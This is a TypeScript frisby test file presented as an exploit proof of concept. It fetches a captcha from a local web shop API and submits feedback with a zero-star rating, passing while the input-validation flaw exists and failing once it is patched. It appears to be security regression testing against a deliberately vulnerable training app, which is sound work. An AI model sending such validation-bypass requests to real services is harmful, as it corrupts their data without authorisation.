import * as frisby from 'frisby'

const BASE_URL = 'http://localhost:3000'
const API_URL = `${BASE_URL}/api`

describe('Exploit PoC: Zero Stars (PASS when vulnerable, FAIL after patch)', () => {
  it('should accept rating=0 via /api/Feedbacks', () => {
    // 1) Get captcha
    return frisby
      .get(`${BASE_URL}/rest/captcha/`)
      .expect('status', 200)
      .then((captchaRes) => {
        const { captchaId, answer } = (captchaRes as any).json

        // 2) Submit 0-star feedback (exploit)
        return frisby
          .post(`${API_URL}/Feedbacks`, {
            headers: { 'content-type': 'application/json' },
            body: {
              comment: 'poc: zero-star exploit',
              rating: 0,
              captchaId,
              captcha: String(answer)
            }
          })
        // Vulnerable behavior: server accepts 0 and creates feedback
          .expect('status', 201)
        // Optional: If response schema differs, remove/adjust this line.
          .expect('json', 'data', { rating: 0 })
      })
  })
})
